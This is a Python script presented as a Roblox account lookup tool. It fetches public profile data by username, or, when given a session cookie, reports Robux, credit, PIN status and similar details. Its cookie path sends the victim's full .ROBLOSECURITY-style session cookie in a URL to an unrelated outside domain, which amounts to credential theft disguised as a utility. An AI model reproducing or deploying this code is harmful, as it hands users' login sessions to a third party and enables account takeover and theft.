import requests, json




def getinfo(user):
    getbyusername = requests.get(f"https://api.roblox.com/users/get-by-username?username={user}")
    if "errorMessage" in getbyusername.json():
        return "Error"
    else:
        userid = getbyusername.json()["Id"]
        usersapi = requests.get(f"https://users.roblox.com/v1/users/{userid}")
        created = usersapi.json()["created"].split("T")[0]
        banned = usersapi.json()["isBanned"]
        displayn = usersapi.json()["displayName"]
        desc = usersapi.json()["description"]
        followers = requests.get(f"https://friends.roblox.com/v1/users/{userid}/followers/count").json()["count"]
        following = requests.get(f"https://friends.roblox.com/v1/users/{userid}/followings/count").json()["count"]
        if desc == "":
            desc = "Empty"      
        return f"Username: {input}\nDisplayName: {displayn}\nUserid: {userid}\nCreated: {created}\nIsBanned: {banned}\nFollowers: {followers}\nFollowing: {following}\nDescription: {desc}"

def getinfocookie(cookie):
    r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}') 
    data = r.json() 

    if data["status"] == "failed":
        return "Invalid Cookie"
    else:
        userid = data["userid"]
        usersapi = requests.get(f"https://users.roblox.com/v1/users/{userid}")
        banned = usersapi.json()["isBanned"]
        username = data["username"]
        displayn = data["displayname"]
        description = data["description"]
        datecreated = data["datecreated"]
        daysold = data["daysold"]
        robux = data["robux"]
        pendingrobux = data["pendingrobux"]
        credit = data["credit"]
        premium = data["premium"]
        friends = data["friends"]
        followers = data["followers"]
        following = data["following"]
        rap = data["rap"]
        gender = data["gender"]
        country = data["country"]
        pin = data["pin"]
        if description == "":
            description = "Empty"      
        return f"Username: {username}\nDisplayName: {displayn}\nUserid: {userid}\nPremium: {premium}\nRap: {rap}\nRobux: {robux}\nCredit: {credit}\nCreated: {datecreated}\nDays-Old: {daysold}\nIsBanned: {banned}\nPin-Enabled: {pin}\nGender: {gender}\nCountry: {country}\nFollowers: {followers}\nFollowing: {following}\nDescription: {description}"


ascii = '''
      _                                               _         _____                    __                       
     / \                                             / |_      |_   _|                  [  |  _                   
    / _ \     .---.  .---.   .--.   __   _   _ .--. `| |-'______ | |       .--.    .--.  | | / ] __   _  _ .--.   
   / ___ \   / /'`\]/ /'`\]/ .'`\ \[  | | | [ `.-. | | | |______|| |   _ / .'`\ \/ .'`\ \| '' < [  | | |[ '/'`\ \ 
 _/ /   \ \_ | \__. | \__. | \__. | | \_/ |, | | | | | |,       _| |__/ || \__. || \__. || |`\ \ | \_/ |,| \__/ | 
|____| |____|'.___.''.___.' '.__.'  '.__.'_/[___||__]\__/      |________| '.__.'  '.__.'[__|  \_]'.__.'_/| ;.__/  
                                                                                                        [__|         
'''

input = input("Enter Users Username/Cookie: ")
if "WARNING" in input:
    print(ascii)
    print(getinfocookie(input))
else:
    print(ascii)
    print(getinfo(input))
